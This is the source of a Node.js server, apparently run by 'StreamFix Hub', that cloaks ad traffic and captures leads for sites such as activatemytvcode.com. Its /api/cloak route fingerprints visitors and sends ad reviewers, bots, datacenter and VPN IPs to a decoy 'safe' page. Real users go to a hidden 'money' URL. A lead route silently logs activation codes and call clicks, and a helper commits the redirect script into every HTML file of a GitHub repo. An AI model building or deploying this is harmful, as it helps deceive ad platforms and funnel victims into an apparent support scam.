const express = require('express');
const path = require('path');
const https = require('https');
const http  = require('http');
const fs = require('fs');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;

// ─── Data file paths ──────────────────────────────────────────────────────────
const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
const LOGS_FILE     = path.join(__dirname, 'data', 'logs.json');
const LEADS_FILE    = path.join(__dirname, 'data', 'leads.json');
const SITES_FILE    = path.join(__dirname, 'data', 'sites.json');
const MAX_LOG_ENTRIES  = 10000;
const MAX_LEAD_ENTRIES = 5000;

const EventEmitter = require('events');
const logEmitter = new EventEmitter();
logEmitter.setMaxListeners(200);

function readSettings() {
  try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch (e) {
    return { moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [] };
  }
}

var RAILWAY_TOKEN_FILE = path.join(__dirname, '.local', 'railway_token');

function getRailwayToken() {
  if (process.env.RAILWAY_API_TOKEN) return process.env.RAILWAY_API_TOKEN;
  try { var t = fs.readFileSync(RAILWAY_TOKEN_FILE, 'utf8').trim(); return t || ''; } catch(e) { return ''; }
}
function setRailwayToken(token) {
  var dir = path.dirname(RAILWAY_TOKEN_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  if (token) { fs.writeFileSync(RAILWAY_TOKEN_FILE, token, { mode: 0o600 }); }
  else { try { fs.unlinkSync(RAILWAY_TOKEN_FILE); } catch(e) {} }
}

function setDeployStatus(siteId, status) {
  var sites = readSites();
  var changed = false;
  for (var i = 0; i < sites.length; i++) {
    if (sites[i].id === siteId && sites[i].deployStatus !== status) {
      sites[i].deployStatus = status;
      changed = true;
      break;
    }
  }
  if (changed) {
    writeSites(sites);
    logEmitter.emit('siteStatus', { siteId: siteId, status: status });
  }
}

function writeSettings(data) {
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(data, null, 2));
}

function readLogs() {
  try { return JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8')); } catch (e) { return []; }
}

function appendLog(entry) {
  var logs = readLogs();
  logs.unshift(entry);
  if (logs.length > MAX_LOG_ENTRIES) logs = logs.slice(0, MAX_LOG_ENTRIES);
  fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
  logEmitter.emit('newLog', entry);
}

// ─── Leads helpers ────────────────────────────────────────────────────────────
function readLeads() {
  try { return JSON.parse(fs.readFileSync(LEADS_FILE, 'utf8')); } catch (e) { return []; }
}

function appendLead(entry) {
  var leads = readLeads();
  leads.unshift(entry);
  if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
  logEmitter.emit('newLead', entry);
}

function markLeadCalled(siteId, ip, code) {
  var leads = readLeads();
  var cutoff = Date.now() - 30 * 60 * 1000;
  var found = false;
  for (var i = 0; i < leads.length; i++) {
    var l = leads[i];
    if (l.type === 'code_submit' && l.siteId === siteId && l.ip === ip && new Date(l.ts).getTime() > cutoff) {
      leads[i].called = true;
      leads[i].calledAt = new Date().toISOString();
      found = true;
      break;
    }
  }
  if (!found) {
    leads.unshift({ type: 'call_click', ts: new Date().toISOString(), siteId: siteId, ip: ip, code: code || '', called: true });
    if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
  }
  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
}

// ─── Sites helpers ────────────────────────────────────────────────────────────
function readSites() {
  try { return JSON.parse(fs.readFileSync(SITES_FILE, 'utf8')); } catch (e) {
    return [{
      id: 'default', name: 'activatemytvcode.com', domain: 'activatemytvcode.com',
      githubRepo: '', railwayProjectId: '', railwayServiceId: '',
      apiKey: crypto.randomUUID(),
      moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [],
      deployStatus: 'live', isDefault: true
    }];
  }
}

function writeSites(sites) {
  fs.writeFileSync(SITES_FILE, JSON.stringify(sites, null, 2));
}

function getSiteByKey(apiKey) {
  if (!apiKey) return null;
  return readSites().find(function(s) { return s.apiKey === apiKey; }) || null;
}

function getDefaultSite() {
  var sites = readSites();
  return sites.find(function(s) { return s.isDefault; }) || sites[0] || null;
}

function getSiteSettings(apiKey) {
  var site = apiKey ? getSiteByKey(apiKey) : null;
  if (!site) site = getDefaultSite();
  var global = readSettings();
  if (!site) return global;
  return {
    // For the default site: settings.json (admin settings form) is always authoritative for URLs/rules
    // For non-default sites: per-site values are independent (empty = no restriction, not a fallback)
    moneyUrl:         site.isDefault ? (global.moneyUrl || '') : (site.moneyUrl || ''),
    safeUrl:          site.isDefault ? (global.safeUrl  || '/safe') : (site.safeUrl || '/safe'),
    enabled:          site.isDefault ? (global.enabled !== false) : (site.enabled !== false),
    blockedIps:       site.isDefault ? (global.blockedIps || []) : (Array.isArray(site.blockedIps) ? site.blockedIps : []),
    allowedCountries: site.isDefault ? (global.allowedCountries || []) : (Array.isArray(site.allowedCountries) ? site.allowedCountries : [])
  };
}

// ─── GitHub auto-inject helper ────────────────────────────────────────────────
var CLOAK_SCRIPT_START = '<!-- StreamFix-Hub-Start -->';
var CLOAK_SCRIPT_END   = '<!-- StreamFix-Hub-End -->';

function buildCloakScript(hubUrl, apiKey) {
  return CLOAK_SCRIPT_START + '\n'
    + '<script>\n'
    + '(function(){var _h=\'' + hubUrl + '\',_k=\'' + apiKey + '\';\n'
    + 'try{fetch(_h+\'/api/cloak\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
    + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
    + 'wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,\n'
    + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
    + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
    + '})();\n'
    + '</script>\n'
    + CLOAK_SCRIPT_END;
}

function githubApiRequest(method, urlPath, token, body) {
  return new Promise(function(resolve, reject) {
    var payload = body ? JSON.stringify(body) : null;
    var opts = {
      hostname: 'api.github.com',
      path: urlPath,
      method: method,
      headers: {
        'Authorization': 'Bearer ' + token,
        'User-Agent': 'StreamFix-Hub/1.0',
        'Accept': 'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28'
      }
    };
    if (payload) {
      opts.headers['Content-Type'] = 'application/json';
      opts.headers['Content-Length'] = Buffer.byteLength(payload);
    }
    var req = https.request(opts, function(res) {
      var data = '';
      res.on('data', function(c) { data += c; });
      res.on('end', function() {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch (e) { resolve({ status: res.statusCode, body: data }); }
      });
    });
    req.on('error', reject);
    req.setTimeout(15000, function() { req.destroy(); reject(new Error('GitHub API timeout')); });
    if (payload) req.write(payload);
    req.end();
  });
}

async function githubInject(site, hubUrl) {
  var token = process.env.GITHUB_TOKEN;
  if (!token || !site.githubRepo) {
    return { ok: false, reason: token ? 'no-repo' : 'no-token' };
  }
  var repoPath = site.githubRepo
    .replace(/^https?:\/\/github\.com\//, '')
    .replace(/\.git$/, '')
    .trim();
  if (!repoPath || repoPath.split('/').length < 2) {
    return { ok: false, reason: 'invalid-repo' };
  }

  try {
    var script = buildCloakScript(hubUrl, site.apiKey);

    // Get file tree
    var treeRes = await githubApiRequest('GET', '/repos/' + repoPath + '/git/trees/HEAD?recursive=1', token);
    if (treeRes.status !== 200) return { ok: false, reason: 'repo-not-found', status: treeRes.status };
    var tree = treeRes.body.tree || [];

    // Find HTML files — prioritise index.html, then other .html at root
    var htmlFiles = tree.filter(function(f) {
      return f.type === 'blob' && /\.html$/i.test(f.path) && f.path.indexOf('/') === -1;
    });
    if (!htmlFiles.length) {
      htmlFiles = tree.filter(function(f) { return f.type === 'blob' && /\.html$/i.test(f.path); });
    }
    if (!htmlFiles.length) return { ok: false, reason: 'no-html-files' };

    // Sort: index.html first
    htmlFiles.sort(function(a, b) {
      var ai = /^index\.html$/i.test(a.path) ? 0 : 1;
      var bi = /^index\.html$/i.test(b.path) ? 0 : 1;
      return ai - bi;
    });

    var injected = [];
    for (var i = 0; i < htmlFiles.length; i++) {
      var f = htmlFiles[i];
      var fileRes = await githubApiRequest('GET', '/repos/' + repoPath + '/contents/' + f.path, token);
      if (fileRes.status !== 200) continue;
      var fileData = fileRes.body;
      var originalContent = Buffer.from(fileData.content || '', 'base64').toString('utf8');

      // Remove existing injection if present
      var re = new RegExp(CLOAK_SCRIPT_START.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&') + '[\\s\\S]*?' + CLOAK_SCRIPT_END.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&'), 'g');
      var stripped = originalContent.replace(re, '');

      // Inject after <head> or at start of <body>
      var newContent;
      if (/<head[^>]*>/i.test(stripped)) {
        newContent = stripped.replace(/(<head[^>]*>)/i, '$1\n' + script + '\n');
      } else if (/<body[^>]*>/i.test(stripped)) {
        newContent = stripped.replace(/(<body[^>]*>)/i, '$1\n' + script + '\n');
      } else {
        newContent = script + '\n' + stripped;
      }

      var putRes = await githubApiRequest('PUT', '/repos/' + repoPath + '/contents/' + f.path, token, {
        message: 'chore: update StreamFix cloaking script [auto]',
        content: Buffer.from(newContent).toString('base64'),
        sha: fileData.sha
      });
      if (putRes.status === 200 || putRes.status === 201) {
        injected.push(f.path);
      }
    }

    if (!injected.length) return { ok: false, reason: 'inject-failed' };

    // Update site deploy status and notify SSE subscribers
    var sites = readSites();
    for (var j = 0; j < sites.length; j++) {
      if (sites[j].id === site.id) {
        sites[j].deployStatus = 'pushed';
        sites[j].lastPushed = new Date().toISOString();
        sites[j].injectedFiles = injected;
        break;
      }
    }
    writeSites(sites);
    logEmitter.emit('siteStatus', { siteId: site.id, status: 'pushed' });
    return { ok: true, injected: injected };
  } catch (e) {
    return { ok: false, reason: 'error', message: e.message };
  }
}

async function autoDiscoverRailwayIds(githubRepoUrl) {
  var token = getRailwayToken();
  if (!token || !githubRepoUrl) return null;
  // Normalize: extract "owner/repo" from full GitHub URL
  var repoPath = githubRepoUrl.replace(/^https?:\/\/github\.com\//, '').replace(/\.git$/, '').toLowerCase().trim();
  if (!repoPath) return null;
  try {
    var qStr = JSON.stringify({ query: 'query { projects { edges { node { id name services { edges { node { id name repoTriggers { edges { node { repository } } } } } } } } } }' });
    return new Promise(function(resolve) {
      var opts = { hostname:'backboard.railway.app', path:'/graphql/v2', method:'POST', headers:{'Authorization':'Bearer '+token,'Content-Type':'application/json','Content-Length':Buffer.byteLength(qStr)} };
      var rq = https.request(opts, function(rs) {
        var d = ''; rs.on('data', c => d += c);
        rs.on('end', function() {
          try {
            var parsed = JSON.parse(d);
            var projects = (parsed.data && parsed.data.projects && parsed.data.projects.edges) || [];
            for (var pi = 0; pi < projects.length; pi++) {
              var proj = projects[pi].node;
              var services = (proj.services && proj.services.edges) || [];
              for (var si = 0; si < services.length; si++) {
                var svc = services[si].node;
                var triggers = (svc.repoTriggers && svc.repoTriggers.edges) || [];
                for (var ti = 0; ti < triggers.length; ti++) {
                  var repo = (triggers[ti].node && triggers[ti].node.repository || '').toLowerCase();
                  if (repo === repoPath || repo.endsWith('/' + repoPath)) {
                    return resolve({ projectId: proj.id, serviceId: svc.id });
                  }
                }
              }
            }
            resolve(null);
          } catch(err) { resolve(null); }
        });
      });
      rq.on('error', () => resolve(null)); rq.setTimeout(10000, () => { rq.destroy(); resolve(null); });
      rq.write(qStr); rq.end();
    });
  } catch(e) { return null; }
}

async function railwayDeploy(site) {
  var token = getRailwayToken();
  if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
  try {
    // Step 1: get latest deployment ID
    var qStr = JSON.stringify({ query: 'query { deployments(input: { projectId: "' + site.railwayProjectId + '", serviceId: "' + site.railwayServiceId + '" }) { edges { node { id status } } } }' });
    var depId = await new Promise(function(resolve) {
      var opts = { hostname:'backboard.railway.app', path:'/graphql/v2', method:'POST', headers:{'Authorization':'Bearer '+token,'Content-Type':'application/json','Content-Length':Buffer.byteLength(qStr)} };
      var rq = https.request(opts, function(rs) {
        var d = ''; rs.on('data', c => d += c);
        rs.on('end', function() {
          try { var p = JSON.parse(d); var e = p.data && p.data.deployments && p.data.deployments.edges; resolve(e && e.length ? e[0].node.id : null); } catch(err) { resolve(null); }
        });
      });
      rq.on('error', () => resolve(null)); rq.setTimeout(8000, () => { rq.destroy(); resolve(null); });
      rq.write(qStr); rq.end();
    });
    if (!depId) return null;
    // Step 2: redeploy via mutation
    var mStr = JSON.stringify({ query: 'mutation { deploymentRedeploy(id: "' + depId + '") { id } }' });
    return new Promise(function(resolve) {
      var opts = { hostname:'backboard.railway.app', path:'/graphql/v2', method:'POST', headers:{'Authorization':'Bearer '+token,'Content-Type':'application/json','Content-Length':Buffer.byteLength(mStr)} };
      var rq = https.request(opts, function(rs) {
        var d = ''; rs.on('data', c => d += c);
        rs.on('end', function() {
          try { var p = JSON.parse(d); resolve({ ok: !!(p.data && p.data.deploymentRedeploy) }); } catch(err) { resolve({ ok: false }); }
        });
      });
      rq.on('error', () => resolve({ ok:false })); rq.setTimeout(8000, () => { rq.destroy(); resolve({ ok:false }); });
      rq.write(mStr); rq.end();
    });
  } catch(e) { return null; }
}

async function getRailwayStatus(site) {
  var token = getRailwayToken();
  if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
  try {
    var query = JSON.stringify({
      query: 'query { deployments(input: { projectId: "' + site.railwayProjectId + '", serviceId: "' + site.railwayServiceId + '" }) { edges { node { status createdAt } } } }'
    });
    return new Promise(function(resolve) {
      var opts = {
        hostname: 'backboard.railway.app',
        path: '/graphql/v2',
        method: 'POST',
        headers: {
          'Authorization': 'Bearer ' + token,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(query)
        }
      };
      var req = https.request(opts, function(res) {
        var data = '';
        res.on('data', function(c) { data += c; });
        res.on('end', function() {
          try {
            var p = JSON.parse(data);
            var edges = p.data && p.data.deployments && p.data.deployments.edges;
            if (edges && edges.length > 0) {
              resolve(edges[0].node.status.toLowerCase());
            } else {
              resolve(null);
            }
          } catch (e) { resolve(null); }
        });
      });
      req.on('error', function() { resolve(null); });
      req.setTimeout(8000, function() { req.destroy(); resolve(null); });
      req.write(query);
      req.end();
    });
  } catch (e) { return null; }
}

// ─── Admin password ───────────────────────────────────────────────────────────
var ADMIN_PASSWORD_HASH;
(function() {
  var pwd = process.env.ADMIN_PASSWORD;
  if (!pwd) {
    var crypto = require('crypto');
    pwd = crypto.randomBytes(9).toString('base64'); // 12-char base64
    console.warn('');
    console.warn('⚠️  WARNING: ADMIN_PASSWORD env var is not set.');
    console.warn('   One-time admin password for this session: ' + pwd);
    console.warn('   Set ADMIN_PASSWORD in your environment to make it permanent.');
    console.warn('');
  }
  ADMIN_PASSWORD_HASH = bcrypt.hashSync(pwd, 10);
})();

// ─── Per-IP frequency store (in-memory, 24-hour window) ──────────────────────
// Map<ip, lastVisitTimestamp>
var ipFreqStore = new Map();
var IP_FREQ_MAX = 10000;
var IP_FREQ_WINDOW_MS = 24 * 60 * 60 * 1000; // 24 hours

function checkFrequency(ip) {
  var now = Date.now();
  var last = ipFreqStore.get(ip);
  if (last && (now - last) < IP_FREQ_WINDOW_MS) {
    // Seen within 24h — it's a repeat click
    ipFreqStore.set(ip, now);
    return true;
  }
  // First visit (or >24h ago) — record and allow
  // Evict oldest entry if store is full
  if (!last && ipFreqStore.size >= IP_FREQ_MAX) {
    var firstKey = ipFreqStore.keys().next().value;
    ipFreqStore.delete(firstKey);
  }
  ipFreqStore.set(ip, now);
  return false;
}

function clearFrequencyStore() {
  ipFreqStore.clear();
}

// ─── Bot / crawler UA blocklist ───────────────────────────────────────────────
var BOT_PATTERNS = [
  /googlebot/i, /adsbot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
  /baiduspider/i, /yandexbot/i, /sogou/i, /exabot/i, /facebot/i,
  /ia_archiver/i, /mj12bot/i, /dotbot/i, /semrushbot/i, /ahrefsbot/i,
  /majestic/i, /rogerbot/i, /screaming.frog/i, /wget/i, /curl/i,
  /python-requests/i, /libwww-perl/i, /java\//i, /go-http-client/i,
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
  /pinterest/i, /slackbot/i, /telegrambot/i, /headlesschrome/i,
  /phantomjs/i, /selenium/i, /webdriver/i, /scrapy/i,
  /crawler/i, /spider/i, /bot\b/i
];

function isBot(ua) {
  if (!ua) return true;
  return BOT_PATTERNS.some(function(p) { return p.test(ua); });
}

// ─── Suspicious ISP/org keywords ─────────────────────────────────────────────
var SUSPICIOUS_ISP = [
  'google', 'amazon', 'microsoft', 'cloudflare', 'digitalocean',
  'linode', 'vultr', 'ovh', 'hetzner', 'facebook', 'apple'
];

function isSuspiciousISP(isp, org) {
  var combined = ((isp || '') + ' ' + (org || '')).toLowerCase();
  return SUSPICIOUS_ISP.some(function(k) { return combined.indexOf(k) !== -1; });
}

// ─── IP reputation check via ip-api.com ──────────────────────────────────────
function checkIP(ip) {
  return new Promise(function(resolve) {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') ||
        ip.startsWith('192.168.') || ip.startsWith('172.')) {
      return resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: 'local', org: '' });
    }
    var opts = {
      hostname: 'ip-api.com',
      path: '/json/' + ip + '?fields=status,country,countryCode,city,regionName,isp,org,proxy,hosting',
      method: 'GET',
      headers: { 'User-Agent': 'node-cloaker/1.0' }
    };
    var req = http.request(opts, function(res) {
      var data = '';
      res.on('data', function(c) { data += c; });
      res.on('end', function() {
        try {
          var p = JSON.parse(data);
          resolve({
            proxy: p.proxy || false,
            hosting: p.hosting || false,
            country: p.countryCode || 'XX',
            city: p.city || '',
            regionName: p.regionName || '',
            isp: p.isp || '',
            org: p.org || ''
          });
        } catch (e) { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); }
      });
    });
    req.on('error', function() { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
    req.setTimeout(4000, function() { req.destroy(); resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
    req.end();
  });
}

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'fallback-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, maxAge: 8 * 60 * 60 * 1000 }
}));

function requireAdmin(req, res, next) {
  if (req.session && req.session.adminAuth) return next();
  res.redirect('/admin/login');
}

// ─── Public routes ────────────────────────────────────────────────────────────
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/peacock', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'peacock.html'));
});

app.get('/safe', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

app.get('/offer', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'offer.html'));
});

// ─── Self-hosted cloaking engine ──────────────────────────────────────────────
app.post('/api/cloak', async function(req, res) {
  var siteKey      = req.headers['x-site-key'] || req.body.siteKey || '';
  var resolvedSite = siteKey ? getSiteByKey(siteKey) : getDefaultSite();
  var settings     = getSiteSettings(siteKey);
  var siteId       = resolvedSite ? resolvedSite.id : 'default';

  var realIP = req.headers['x-forwarded-for']
    ? req.headers['x-forwarded-for'].split(',')[0].trim()
    : req.connection.remoteAddress;

  var ua = req.headers['user-agent'] || req.body.ua || '';
  var tz = req.body.tz || '';
  var sw = parseInt(req.body.sw) || 0;
  var sh = parseInt(req.body.sh) || 0;
  var wd = req.body.wd === true || req.body.wd === 'true';
  var pl = parseInt(req.body.pl) || 0;
  var screenStr = sw + 'x' + sh;

  var moneyUrl = settings.moneyUrl || '/offer';
  var safeUrl  = settings.safeUrl  || '/safe';

  function fastBlock(reason) {
    var entry = {
      ts: new Date().toISOString(), ip: realIP, siteId: siteId,
      country: 'XX', city: '', region: '', isp: '',
      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
      decision: 'block', reason: reason
    };
    appendLog(entry);
    return res.json({ decision: 'block', url: safeUrl });
  }

  // Cloaking disabled → always allow
  if (!settings.enabled) {
    appendLog({
      ts: new Date().toISOString(), ip: realIP, siteId: siteId,
      country: 'XX', city: '', region: '', isp: '',
      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
      decision: 'allow', reason: 'disabled'
    });
    return res.json({ decision: 'allow', url: moneyUrl });
  }

  // 1. Manual IP blocklist — checked first so it always wins with reason manual-block
  var blockedIps = Array.isArray(settings.blockedIps) ? settings.blockedIps : [];
  if (blockedIps.indexOf(realIP) !== -1) return fastBlock('manual-block');

  // 2. Repeat-click frequency check — only for IPs not on the manual list
  if (checkFrequency(realIP)) return fastBlock('repeat-click');

  // 3. Bot User-Agent check
  if (isBot(ua)) return fastBlock('bot-ua');

  // 4. Webdriver flag
  if (wd) return fastBlock('webdriver');

  // 5. Screen size checks
  if (sw === 0 || sh === 0) return fastBlock('no-screen');
  if ((sw === 800 && sh === 600) || (sw === 1024 && sh === 768)) {
    if (pl === 0) return fastBlock('headless-screen');
  }

  // 6. Plugin count + desktop UA check
  var isMobile = /iPhone|Android|iPad|Mobile/i.test(ua);
  var isDesktop = /Windows|Macintosh/i.test(ua);
  if (!isMobile && isDesktop && pl === 0) return fastBlock('no-plugins-desktop');

  // 7. IP reputation check (includes city/region/ISP/country)
  var ipData;
  try { ipData = await checkIP(realIP); } catch (e) {
    ipData = { proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' };
  }

  var decision = 'allow';
  var reason   = 'clean';

  // 8. Country/geo filter (after IP lookup, before other network checks)
  var allowedCountries = Array.isArray(settings.allowedCountries) ? settings.allowedCountries : [];
  if (allowedCountries.length > 0) {
    var visitorCC = (ipData.country || 'XX').toUpperCase();
    var allowed = allowedCountries.some(function(cc) { return cc.toUpperCase() === visitorCC; });
    if (!allowed) {
      decision = 'block';
      reason   = 'country-block';
    }
  }

  // 9. Suspicious ISP/org check
  if (decision === 'allow' && isSuspiciousISP(ipData.isp, ipData.org)) {
    decision = 'block';
    reason   = 'suspicious-isp';
  }

  // 10. Proxy / hosting check
  if (decision === 'allow' && (ipData.proxy || ipData.hosting)) {
    decision = 'block';
    reason   = ipData.proxy ? 'proxy-vpn' : 'datacenter';
  }

  appendLog({
    ts: new Date().toISOString(),
    ip: realIP,
    siteId: siteId,
    country: ipData.country || 'XX',
    city: ipData.city || '',
    region: ipData.regionName || '',
    isp: ipData.isp || '',
    ua: ua.slice(0, 80),
    screen: screenStr,
    plugins: pl,
    decision: decision,
    reason: reason
  });

  res.json({ decision: decision, url: decision === 'allow' ? moneyUrl : safeUrl });
});

// ─── Legacy redirect ───────────────────────────────────────────────────────────
app.post('/api/cloakify', function(req, res) {
  res.redirect(307, '/api/cloak');
});

// ─── Lead capture (public — fires silently from amazon-activate page) ─────────
app.post('/api/track/lead', async function(req, res) {
  res.json({ ok: true }); // respond immediately, never block the client
  try {
    var siteKey = req.headers['x-site-key'] || req.body.siteKey || '';
    var site    = siteKey ? getSiteByKey(siteKey) : getDefaultSite();
    var siteId  = site ? site.id : 'default';

    var type   = req.body.type || 'code_submit';
    var realIP = req.headers['x-forwarded-for']
      ? req.headers['x-forwarded-for'].split(',')[0].trim()
      : req.connection.remoteAddress;
    var code = (req.body.code || '').slice(0, 20).toUpperCase();

    if (type === 'call_click') {
      markLeadCalled(siteId, realIP, code);
      return;
    }

    var ua = req.headers['user-agent'] || req.body.ua || '';
    var ipData;
    try { ipData = await checkIP(realIP); } catch (e) {
      ipData = { country: 'XX', city: '', regionName: '', isp: '' };
    }

    appendLead({
      type:         'code_submit',
      ts:           new Date().toISOString(),
      ip:           realIP,
      siteId:       siteId,
      country:      ipData.country      || 'XX',
      city:         ipData.city         || '',
      region:       ipData.regionName   || '',
      isp:          ipData.isp          || '',
      ua:           ua.slice(0, 120),
      code:         code,
      screen:       (parseInt(req.body.sw) || 0) + 'x' + (parseInt(req.body.sh) || 0),
      tz:           (req.body.tz         || '').slice(0, 50),
      referrer:     (req.body.referrer   || '').slice(0, 200),
      utm_source:   (req.body.utm_source   || '').slice(0, 80),
      utm_campaign: (req.body.utm_campaign || '').slice(0, 80),
      utm_term:     (req.body.utm_term     || '').slice(0, 80),
      utm_content:  (req.body.utm_content  || '').slice(0, 80),
      gclid:        (req.body.gclid        || '').slice(0, 80),
      called:       false
    });
  } catch (e) { /* silently swallow — never break client experience */ }
});

// ─── Admin login ──────────────────────────────────────────────────────────────
app.get('/admin/login', function(req, res) {
  if (req.session && req.session.adminAuth) return res.redirect('/admin');
  var error = req.query.error ? '<p class="error">Invalid credentials. Try again.</p>' : '';
  res.send(adminLoginPage(error));
});

app.post('/admin/login', function(req, res) {
  var password = req.body.password || '';
  if (bcrypt.compareSync(password, ADMIN_PASSWORD_HASH)) {
    req.session.adminAuth = true;
    return res.redirect('/admin');
  }
  res.redirect('/admin/login?error=1');
});

// ─── Admin logout ─────────────────────────────────────────────────────────────
app.get('/admin/logout', function(req, res) {
  req.session.destroy(function() { res.redirect('/admin/login'); });
});

// ─── Admin dashboard ──────────────────────────────────────────────────────────
var LOG_PAGE_SIZE  = 100;
var LEAD_PAGE_SIZE = 50;

app.get('/admin', requireAdmin, function(req, res) {
  var settings   = readSettings();
  var sites      = readSites();
  var siteFilter = req.query.site || '';
  var siteCreated = req.query.siteCreated === '1';

  // Find selected site object (null = All Sites)
  var selectedSite = siteFilter ? sites.find(function(s) { return s.id === siteFilter; }) : null;

  // Merge default site settings into settings for backwards compat display
  if (selectedSite) {
    settings = {
      moneyUrl: selectedSite.moneyUrl, safeUrl: selectedSite.safeUrl,
      enabled: selectedSite.enabled !== false,
      blockedIps: selectedSite.blockedIps || [],
      allowedCountries: selectedSite.allowedCountries || []
    };
  }

  var allLogs   = readLogs();
  var allLeads  = readLeads();

  // Filter by site if selected
  if (siteFilter) {
    allLogs  = allLogs.filter(function(l) {
      var lid = l.siteId || 'default';
      return lid === siteFilter;
    });
    allLeads = allLeads.filter(function(l) {
      var lid = l.siteId || 'default';
      return lid === siteFilter;
    });
  }

  var allSubmits = allLeads.filter(function(l) { return l.type === 'code_submit'; });

  var logTotal  = allLogs.length;
  var leadTotal = allSubmits.length;

  var logMaxPage  = Math.max(1, Math.ceil(logTotal  / LOG_PAGE_SIZE));
  var leadMaxPage = Math.max(1, Math.ceil(leadTotal / LEAD_PAGE_SIZE));

  var logPage  = Math.min(logMaxPage,  Math.max(1, parseInt(req.query.logPage)  || 1));
  var leadPage = Math.min(leadMaxPage, Math.max(1, parseInt(req.query.leadPage) || 1));

  var logStart  = (logPage - 1)  * LOG_PAGE_SIZE;
  var leadStart = (leadPage - 1) * LEAD_PAGE_SIZE;

  var logs  = allLogs.slice(logStart, logStart + LOG_PAGE_SIZE);
  var leads = allSubmits.slice(leadStart, leadStart + LEAD_PAGE_SIZE);

  var activeIpTimes = (function() {
    var cutoff = Date.now() - 3 * 60 * 1000;
    var seen = {};
    allLogs.forEach(function(l) {
      if (l.ip && l.ts) {
        var t = new Date(l.ts).getTime();
        if (t > cutoff) seen[l.ip] = Math.max(seen[l.ip] || 0, t);
      }
    });
    return seen;
  })();
  var activeCount = Object.keys(activeIpTimes).length;
  var recentEvents = allLogs.slice(0, 8);

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');

  res.send(adminDashboardPage(settings, logs, leads, {
    logPage: logPage, logTotal: logTotal,
    leadPage: leadPage, leadTotal: leadTotal,
    activeCount: activeCount, recentEvents: recentEvents,
    activeIpTimes: activeIpTimes,
    allLogs: allLogs, allLeads: allLeads,
    sites: sites, siteFilter: siteFilter,
    selectedSite: selectedSite,
    hubUrl: hubUrl,
    siteCreated: siteCreated,
    hasGithubToken: !!process.env.GITHUB_TOKEN,
    hasRailwayToken: !!getRailwayToken(),
    displayTz: req.session.displayTz || 'UTC'
  }));
});

// ─── Admin SSE events ─────────────────────────────────────────────────────────
app.get('/admin/events', requireAdmin, function(req, res) {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  function onLog(entry) {
    res.write('data: ' + JSON.stringify({ type: 'log', entry: entry }) + '\n\n');
  }
  function onLead(entry) {
    res.write('data: ' + JSON.stringify({ type: 'lead', entry: entry }) + '\n\n');
  }
  function onSiteStatus(payload) {
    res.write('data: ' + JSON.stringify({ type: 'siteStatus', siteId: payload.siteId, status: payload.status }) + '\n\n');
  }

  logEmitter.on('newLog', onLog);
  logEmitter.on('newLead', onLead);
  logEmitter.on('siteStatus', onSiteStatus);

  var keepAlive = setInterval(function() {
    res.write(': ping\n\n');
  }, 25000);

  req.on('close', function() {
    logEmitter.removeListener('newLog', onLog);
    logEmitter.removeListener('newLead', onLead);
    logEmitter.removeListener('siteStatus', onSiteStatus);
    clearInterval(keepAlive);
  });
});

// ─── Admin settings save (URLs) ───────────────────────────────────────────────
app.post('/admin/settings', requireAdmin, function(req, res) {
  var settings = readSettings();
  settings.moneyUrl = (req.body.moneyUrl || '').trim();
  settings.safeUrl  = (req.body.safeUrl  || '/safe').trim();
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Railway token setup ──────────────────────────────────────────────────────
